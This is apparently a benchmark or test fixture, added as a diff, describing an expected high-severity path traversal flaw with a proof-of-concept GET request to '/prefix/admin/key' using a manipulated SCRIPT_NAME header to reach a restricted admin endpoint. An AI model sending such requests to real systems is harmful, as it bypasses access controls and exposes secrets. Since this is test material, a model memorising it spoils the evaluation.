@@ -1,0 +1,11 @@
+{
+  "expected_vulnerability": "Path Traversal",
+  "severity": "High",
+  "oracle": "access_restricted_admin_endpoint",
+  "poc": {
+    "method": "GET",
+    "path": "/prefix/admin/key",
+    "headers": {"SCRIPT_NAME": "prefix/"},
+    "indicator": "wsgi_script_name_path_manipulation"
+  }
+}
